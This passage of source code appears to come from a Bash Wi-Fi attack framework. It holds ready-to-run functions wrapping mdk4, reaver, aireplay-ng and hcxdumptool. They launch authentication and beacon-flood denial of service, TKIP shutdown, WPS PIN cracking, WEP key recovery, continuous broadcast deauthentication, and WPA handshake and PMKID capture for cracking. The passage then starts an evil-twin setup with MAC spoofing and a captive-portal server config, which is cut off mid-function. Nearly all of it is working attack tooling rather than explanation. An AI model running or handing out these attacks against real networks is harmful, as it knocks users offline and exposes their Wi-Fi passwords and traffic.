function wids_confusion_attack(){
  clear
  color_output_ln "*" "In this attack, you can cross-connect clients to multiple WDS nodes or fake rogue APs to confuse the access point"
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Do you want to activate the Zero_Chaos' WIDS exploit? (default=no) (${yC}yes${blueC}/${yC}no${blueC}): " && read zero_chaos
  else
    color_output_no_line "*" "Quieres activar el exploit de WIDS Zero_Chaos? (por defecto=no) (${yC}si${blueC}/${yC}no${blueC}): " && read zero_chaos
  fi

  if [ "$zero_chaos" == "y" ] || [ "$zero_chaos" == "yes" ] || [ "$zero_chaos" == "s" ] || [ "$zero_chaos" == "si" ]; then
    zero_chaos="true"
  elif [ "$zero_chaos" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting WIDS Confusion attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Confusión WIDS, presiona Ctrl+C para pararlo"
  fi

  if [ "$zero_chaos" != "true" ] && [ "$verbose" == "false" ]; then
    mdk4 ${netCard} w -e "${essid}" -c ${channel} &>/dev/null &
  elif [ "$zero_chaos" == "true" ] && [ "$verbose" == "false" ]; then
    mdk4 ${netCard} w -e "${essid}" -c ${channel} -z &>/dev/null &
  elif [ "$zero_chaos" != "true" ] && [ "$verbose" == "true" ]; then
    mdk4 ${netCard} w -e "${essid}" -c ${channel} &
  elif [ "$zero_chaos" == "true" ] && [ "$verbose" == "true" ]; then
    mdk4 ${netCard} w -e "${essid}" -c ${channel} -z &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}

# Authentication DoS attack (mdk4)
function authentication_attack(){
  clear
  color_output_ln "*" "In this attack, authentication frames are sent to the access point trying to overload it, causing it to freeze or reset sometimes"
  scan_aps # Scan nearby APs
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    reset_info
    return
  fi
  parse_info

  ask_to_capture_handshakes

  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    reset_info
    return
  fi

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Authentication DoS attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Autenticación DoS, presiona Ctrl+C para pararlo"
  fi

  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel

  if [ "$verbose" == "false" ]; then
    mdk4 ${netCard} a -i ${ap_bssid} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    mdk4 ${netCard} a -i ${ap_bssid} &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
  
  if [ "$c_h" == "true" ]; then
    echo
    if [ "$lang" == "en" ]; then
      progress_bar 4 2.2 "*" "Waiting while clients reconect to AP in order to capture handshakes"
    else
      progress_bar 4 2.2 "*" "Esperando mientras los clientes se reconectan al AP para capturar los handshakes"
    fi

    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

    move_capture_files
    check_captured_handshakes
    log_capture_files
  fi

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}

# Beacon Flood attack (mdk4)
function beacon_flood_attack(){
  clear
  color_output_ln "*" "In this attack, a lot of beacon frames are sent to create fake access points, this may disrupt the availability of a wireless network"
  scan_aps # Scan nearby APs
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="300s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "File containing names of APs to create (leave empty for random names): " && read beacon_option
  else
    color_output_no_line "*" "Archivo con los nombres de los APs a crear (dejalo en blanco para nombres aleatorios): " && read beacon_option
  fi

  if [ "$beacon_option" == "back" ]; then
    reset_info
    return
  elif [ "$beacon_option" == "exit" ] || [ "$beacon_option" == "quit" ]; then
    ctrl_c
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Beacon Flood attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque Beacon Flood, presiona Ctrl+C para pararlo"
  fi

  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel
  sleep 0.2

  if [ ! "$beacon_option" ] && [ "$verbose" == "false" ]; then
    mdk4 ${netCard} b -c ${channel} -s 200 &>/dev/null &

  elif [ ! "$beacon_option" ] && [ "$verbose" == "true" ]; then
    echo
    mdk4 ${netCard} b -c ${channel} -s 200 &

  elif [ "$beacon_option" ] && [ "$verbose" == "false" ]; then
    mdk4 ${netCard} b -c ${channel} -s 200 -f "${beacon_option}" &>/dev/null &

  elif [ "$beacon_option" ] && [ "$verbose" == "true" ]; then
    echo
    mdk4 ${netCard} b -c ${channel} -s 200 -f "${beacon_option}" &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}

# TKIP (Michael Shutdown Exploitation) attack (mdk4)
function tkip_attack(){
  clear
  color_output_ln "*" "In this attack, random or duplicate packets are sent to different QoS queues which can trigger Michael Countermeasures on TKIP access points, leading to a one-minute AP shutdown"
  scan_aps # Scan nearby APs
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  
  default="120s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi
  parse_info

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting TKIP (Michael Shutdown Exploitation) attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque TKIP (Michael Shutdown Exploitation), presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    mdk4 ${netCard} m -t ${ap_bssid} -w 1 -n 1024 -s 1024 &>/dev/null &

  elif [ "$verbose" == "true" ]; then
    echo
    mdk4 ${netCard} m -t ${ap_bssid} -w 1 -n 1024 -s 1024 &
  fi

  mdk4_PID=$!
  sleep "${attack_time}"
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}


#
# WPS attacks
#

# WPS Pixie Dust attack (reaver)
function pixie_dust_attack(){
  clear
  color_output_ln "*" "This attack tries to figure out the WPS PIN by discovering the two main key nonces so that the WPA password can be found"
  scan_aps_wps # Scan nearby APs
  log_back_to_menu

  ask_bssid
  if [ "${ap_bssid}" == "back" ]; then
    return
  fi
  parse_info_wps

  default="2m"
  ask_time
  if [ "${attack_time}" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Pixie Dust attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque Pixie Dust, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -v &
    else
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -v -5 &
    fi
  elif [ "$verbose" == "true" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -vv &
    else
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -K 1 -N -vv -5 &
    fi
  fi

  reaver_PID=$!
  sleep "${attack_time}"
  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null

  write_informative_log
  log_completed
  reset_info
  keep_exit
}

# WPS PIN Bruteforce attack (reaver)
function pin_bruteforce_attack(){
  clear
  color_output_ln "*" "This attack tries to bruteforce the WPS PIN so that the WPA password can be discovered"
  scan_aps_wps # Scan nearby APs
  log_back_to_menu

  ask_bssid
  if [ "${number}" == "back" ]; then
    return
  fi
  parse_info_wps

  default="5m"
  ask_time
  if [ "${attack_time}" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting PIN bruteforce attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de fuerza bruta de PIN, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -v &
    else
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -v -5 &
    fi
  elif [ "$verbose" == "true" ]; then
    if [ "$channel" -le 14 ]; then
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -vv &
    else
      reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -L -f -N -d 2 -vv -5 &
    fi
  fi

  reaver_PID=$!
  sleep "${attack_time}"
  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null

  write_informative_log
  log_completed
  reset_info
  keep_exit
}

# Null Pin attack (reaver)
function null_pin_attack(){
  clear
  color_output_ln "*" "This attack sends a null PIN to check if the access point receives it as a valid PIN so that the WPA password can be discovered"
  scan_aps_wps # Scan nearby APs
  log_back_to_menu

  ask_bssid
  if [ "$ap_bssid" == "back" ]; then
    return
  fi
  parse_info_wps

  default="1m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Null Pin attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Pin nulo, presiona Ctrl+C para pararlo"
  fi

  # Perform attack
  if [ "$channel" -le 14 ]; then
    reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -L -f -N -g 1 -d 2 -p '' -vv &
  else
    reaver -i "${netCard}" -b "${ap_bssid}" -c "${channel}" -L -f -N -g 1 -d 2 -p '' -vv -5 &
  fi
  reaver_PID=$!
  sleep "${attack_time}"
  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null
	
  write_informative_log
  log_completed
  reset_info
  keep_exit
}


#
# WEP attacks
#

# ARP Replay attack (aireplay-ng)
function arp_replay_attack(){
  clear
  color_output_ln "*" "This attack consists in sending tons of ARP packets to capture enough IVs to crack the WEP key"
  scan_aps # Scan nearby APs
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Replay attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de Replay, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -3 -x 1024 -g 1000000 -b ${ap_bssid} -h ${current_mac} ${netCard} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    aireplay-ng -3 -x 1024 -g 1000000 -b ${ap_bssid} -h ${current_mac} ${netCard} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 0.5
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

    move_capture_files
    log_capture_files
  fi

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}

# HIRTE attack (aireplay-ng)
function hirte_attack(){
  clear
  color_output_ln "*" "This attack combines the fragmentation attack and the caffe latte attack to crack the WEP key"
  scan_aps # Scan nearby APs
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting HIRTE attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque HIRTE, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -7 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    aireplay-ng -7 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 0.5
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

    echo
    move_capture_files
    log_capture_files
  fi

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}

# Caffe Latte attack (aireplay-ng)
function caffe_latte_attack(){
  clear
  color_output_ln "*" "The Cafe Latte attack allows you to obtain a WEP key from a client system, this is done by capturing an ARP packet, manipulating it and then send it back to the client"
  scan_aps # Scan nearby APs
  log_back_to_menu
  
  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Caffe Latte attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque Caffe Latte, presiona Ctrl+C para pararlo"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -6 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    echo
    aireplay-ng -6 -F -D -b ${ap_bssid} -h ${current_mac} ${netCard} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 0.5
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

    echo
    move_capture_files
    log_capture_files
  fi

  rm replay_arp-*.cap 2>/dev/null

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}

# Fake Authentication attack (aireplay-ng)
function fake_authentication_attack(){
  clear
  color_output_ln "*" "This attack creates fake devices to make the access point generate new IVs so that the WEP key can be discovered"
  scan_aps # Scan nearby APs
  log_back_to_menu
  
  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
  ask_to_capture_ivs

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting Fake Authentication attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque de autenticación falsa, presiona Ctrl+C para pararlo"
  fi

  echo
  if [ "$verbose" == "false" ]; then
    aireplay-ng -1 3 -o 1 -q 10 -a "${ap_bssid}" -h "${current_mac}" ${netCard} &>/dev/null &
  elif [ "$verbose" == "true" ]; then
    aireplay-ng -1 3 -o 1 -q 10 -a "${ap_bssid}" -h "${current_mac}" ${netCard} &
  fi

  aireplay_PID=$!
  sleep "${attack_time}"
  kill -9 ${aireplay_PID} 2>/dev/null; wait ${aireplay_PID} 2>/dev/null

  echo
  if [ "${c_i}" == "true" ]; then # Enter here is user wants to capture IVs
    sleep 0.5
    kill -9 ${airodump_PID} 2>/dev/null; wait ${airodump_PID} 2>/dev/null

    echo
    move_capture_files
    log_capture_files
  fi

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"
  reset_info
  keep_exit
}


#
# Handshake attacks
#

# Passive WPA Capture attack (airodump-ng)
function passive_capture_attack(){
  clear
  color_output_ln "*" "This attack tries to capture network packets constantly in order to catch a handshake of a device connecting to the access point"
  scan_aps # Scan nearby APs
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="5m"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting passive WPA handshake capture attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque pasivo de captura de handshake WPA, presiona Ctrl+C para pararlo"
  fi

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"
  cap_name=$(date +"%Y-%m-%d-%H-%M-%S")

  if [ "${airmon_check_kill}" == "true" ]; then
    xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry -10+10 -T "Airodump-ng" -xrm 'XTerm*selectToClipboard: true' -e "airodump-ng -c ${channel} -w \"/usr/share/wef/main/captures/${ap_dir}/${cap_name}\" --bssid \"${ap_bssid}\" ${netCard}" 2>/dev/null & # Escape double quotes to avoid errors
  else
    airodump-ng -c ${channel} -w "/usr/share/wef/main/captures/${ap_dir}/${cap_name}" --bssid "${ap_bssid}" ${netCard} &
  fi
  passive_PID=$!

  sleep "${attack_time}" # Sleep for the asked time
  kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null # Kill background process

  echo
  move_capture_files
  check_captured_handshakes
  write_informative_log

  log_completed
  log_capture_files
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"

  c_h="true"
  ask_to_crack_handshakes

  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_handshake
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    ctrl_c
  else
    reset_info
    keep_exit
  fi
}

# PMKID attack (hcxtools)
function pmkid_attack(){
  clear
  color_output_ln "*" "This attack attempts to catch the PMKID handshake of an access point. This is a clientless attack"
  scan_aps # Scan nearby APs
  log_back_to_menu

  # Disable monitor mode as hcxtools may break if interface is in monitor mode
  airmon-ng stop ${netCard} &>/dev/null

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info

  default="180s"
  ask_time
  if [ "$attack_time" == "back" ]; then
    return
  fi

  # Parse wifi info
  if [[ $channel -le 14 ]]; then
    pmkid_channel="${channel}a"
  elif [[ $channel -gt 14 ]]; then
    pmkid_channel="${channel}b"
  fi

  clear
  log_attack_info
  press_enter_attack
  echo
  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting PMKID attack, press Ctrl+C to stop it"
  else
    progress_bar 2 0.2 "*" "Comenzando ataque PMKID, presiona Ctrl+C para pararlo"
  fi

  if [ "${ap_bssid}" ] && [ "${essid}" ]; then
    ap_dir="${essid}-${ap_bssid}"
  elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
    ap_dir="${ap_bssid}"
  fi

  check_and_create "/usr/share/wef/main/captures/${ap_dir}"

  file_date="$(date +"%Y-%m-%d-%H-%M-%S")"
  hcxdumptool -i ${oldCard} -c ${pmkid_channel} -w "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng" | grep -v "bye-bye" &
  hcx_PID=$!
  sleep "${attack_time}"
  kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null
  sleep 0.5

  if [ ! "${ctrl_c_pressed}" ]; then
    echo
    if [ "$lang" == "en" ]; then
      color_output "*" "Extracting hashes from /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng"
    else
      color_output "*" "Extrayendo hashes de /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng"
    fi
    sleep 1.2 # Let the user read

    if [ "$verbose" == "false" ]; then
      hcxpcapngtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng" &>/dev/null
    elif [ "$verbose" == "true" ]; then
      echo
      hcxpcapngtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid.pcapng"
    fi; sleep 1
  fi

  if [ ! "${ctrl_c_pressed}" ]; then
    if [ -f "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" ]; then
      if [ "$lang" == "en" ]; then
        progress_bar 2 0.2 "*" "Filtering target AP hashes"
      else
        progress_bar 2 0.2 "*" "Filtrando hashes del AP objetivo"
      fi

      if [ "$verbose" == "false" ]; then
        hcxhashtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt" &>/dev/null
      elif [ "$verbose" == "true" ]; then
        hcxhashtool -o "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" --type=1 --mac-ap=${ap_bssid} -i "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_mixed_handshakes.txt"
      fi; sleep 0.2
    fi
  fi

  # Re-enable monitor mode (with airmon-ng)
  ip link set ${oldCard} down 2>/dev/null
  iw ${oldCard} set type managed 2>/dev/null
  ip link set ${oldCard} up 2>/dev/null
  airmon-ng start ${oldCard} &>/dev/null

  write_informative_log
  log_completed
  create_graph "/usr/share/wef/cache/airodump-01.csv" "/usr/share/wef/main/graphs/${cap_name}.png"

  if [ -f "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" ]; then
    if [ "$lang" == "en" ]; then
      handshake_total=$(wc -l "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
      color_output "*" "${handshake_total} handshakes written to /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt"
      color_output_no_line "*" "Do you want to crack the PMKID handshakes? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
    else
      handshake_total=$(wc -l "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt" | awk '{print $1}')
      color_output "*" "${handshake_total} handshakes almacenados en /usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt"
      color_output_no_line "*" "¿Quieres crackear los handshakes PMKID? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read crack_option
    fi

  else
    if [ "$lang" == "en" ]; then
      color_output "*" "No PMKID handshakes captured"
    else
      color_output "*" "No se han capturado handshakes PMKID"
    fi
  fi
  
  if [ "$crack_option" == "y" ] || [ "$crack_option" == "yes" ] || [ "$crack_option" == "s" ] || [ "$crack_option" == "si" ]; then
    crack_pmkid_handshakes "/usr/share/wef/main/captures/${ap_dir}/${file_date}_pmkid_filtered_handshakes.txt"
  elif [ "$crack_option" == "exit" ] || [ "$crack_option" == "quit" ]; then
    ctrl_c
  else
    reset_info
    keep_exit
  fi
}


# Inhibitor Function
function inhibitor(){
  trap inhibition_c INT # Change Ctrl+C keyboard interrupt function

  iw dev ${netCard} set channel ${channel} 2>/dev/null # Configure the interface on the same channel

  if [ "$lang" == "en" ]; then
    progress_bar 2 0.2 "*" "Starting inhibition process"
    color_output_ln "*" "Press Ctrl+C to stop the attack"
  else
    progress_bar 2 0.2 "*" "Comenzando proceso de inhibición" 
    color_output_ln "*" "Presiona Ctrl+C para parar el ataque"
  fi

  if [ "$verbose" == "false" ]; then
    aireplay-ng -0 0 -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard} &>/dev/null
  elif [ "$verbose" == "true" ]; then
    echo
    aireplay-ng -0 0 -a "${ap_bssid}" -c FF:FF:FF:FF:FF:FF ${netCard}
    echo
  fi

  if [ "$lang" == "en" ]; then
    good_output_ln "+" "Inhibition process completed"
  else
    good_output_ln "+" "Proceso de inhibición completada"
  fi

  reset_info
}




#
# Evil Twin attack functions
#

function setup_interface_eviltwin(){
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    if hash rfkill 2> /dev/null; then
      rfkill unblock all > /dev/null 2>&1
    fi

    ip link set "${evilCard}" down 2>/dev/null
    iw "${evilCard}" set monitor control 2>/dev/null
    # Check MAC spoofing
    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
      macchanger -m "${ap_bssid}" ${evilCard} &>/dev/null
    fi
    ip link set "${evilCard}" up 2>/dev/null

    rand_mac="$(hexdump -n 6 -ve '1/1 "%.2x "' /dev/random | awk -v a="2,6,a,e" -v r="$RANDOM" 'BEGIN{srand(r);}NR==1{split(a,b,",");r=int(rand()*4+1);printf "%s%s:%s:%s:%s:%s:%s\n",substr($1,0,1),b[r],$2,$3,$4,$5,$6}')"
    iw "${evilCard}" interface add "mon${evilCard}" type monitor addr ${rand_mac}; sleep 0.3

  else
    ip link set "${evilCard}" down 2>/dev/null
    #iwconfig "${evilCard}" mode monitor 2>/dev/null
    iw "${evilCard}" set type monitor 2>/dev/null
    # Check MAC spoofing
    if [ "$mac_spoof" == "y" ] || [ "$mac_spoof" == "yes" ] || [ "$mac_spoof" == "s" ] || [ "$mac_spoof" == "si" ]; then
      macchanger -m "${ap_bssid}" ${evilCard} &>/dev/null
    fi
    ip link set "${evilCard}" up 2>/dev/null
  fi
}

function restore_interface_eviltwin(){
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    iw "mon${evilCard}" del 2>/dev/null; sleep 0.2
  fi

  ip link set "${evilCard}" down 2>/dev/null; sleep 0.1
  #iwconfig "${evilCard}" mode managed 2>/dev/null; sleep 0.1
  iw "${evilCard}" set type managed 2>/dev/null; sleep 0.1
  ip link set "${evilCard}" up 2>/dev/null; sleep 0.2
}

function create_lighttpd_conf(){
  { 
  echo -e "server.document-root = \"${portal_path}\"\n"
	echo -e "server.modules = ("
	echo -e "  \"mod_auth\","
	echo -e "  \"mod_cgi\","
	echo -e "  \"mod_redirect\""
	echo -e ")\n"
	echo -e "\$HTTP[\"host\"] =~ \"(.*)\" {"
	echo -e "  url.redirect = ( \"^/index.htm$\" => \"/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "\$HTTP[\"host\"] =~ \"gstatic.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.google.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
